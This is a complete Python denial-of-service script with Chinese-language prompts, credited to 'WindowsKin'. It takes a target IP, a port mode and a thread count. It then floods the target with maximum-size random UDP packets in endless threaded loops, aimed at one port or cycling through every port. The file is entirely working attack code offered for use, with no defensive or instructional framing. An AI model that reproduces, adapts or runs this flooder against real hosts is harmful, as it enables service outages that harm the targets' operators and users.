import os
import socket
import threading
from time import sleep
from random import randbytes , _urandom

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system("clear")
ip = input("""
Python3  dos工具

提示：需要强劲的电脑，起步条件CPU 8核以上，内存条8GB以上，才能达到预期效果！！！

作者          : WindowsKin
版本          : V1.0

请输入 IP : """)
mode_p = input("""
1.字节数据
2.数据包
请输入攻击类型 : """)
if mode_p == "1":
    bytes = randbytes(65507)
elif mode_p == "2":
    bytes = _urandom(65507)
else:
    print('检测到你输入了无效内容，已以为你选择默认值"2"')
    sleep(2)
    bytes = _urandom(65507)
mode = input("""
1.从指定端口进行攻击
2.从端口 1 ~ 65534 依次进行循坏攻击
请输入攻击方式 : """)
if mode == "1":
    port = int(input("请输入 端口 : "))
elif mode != "2":
    print('检测到你输入了无效内容，已以为你选择默认值"2"')
    sleep(2)
    mode = "2"
try:
    sc = int(input("请输入 线程数量(不能为0) : "))
    if sc == 0:
        print('检测到你输入了无效内容，已以为你选择默认值"1"')
        sleep(2)
        sc = 1
except ValueError:
    print('检测到你输入了无效内容，已以为你选择默认值"1"')
    sleep(2)
    sc = 1
os.system("clear")

if mode == "1":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip} {port} 端口")
elif mode == "2":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip}")

def dos_1(bytes , ip , port):
    while True:
        try:
            sock.sendto(bytes , (ip , port))
        except OSError:
            pass

def dos_2(bytes , ip):
    port = 4444
    while True:
        try:
            sock.sendto(bytes , (ip , port))
            if port == 65534:
                port = 1
            else:
                port += 1
        except OSError:
            pass

if mode == "1":
    for i in range(sc):
        dos_1_sc = threading.Thread(target = dos_1 , args = (bytes , ip , port))
        dos_1_sc.start()
elif mode == "2":
    for i in range(sc):
        dos_2_sc = threading.Thread(target = dos_2 , args = (bytes , ip))
        dos_2_sc.start()
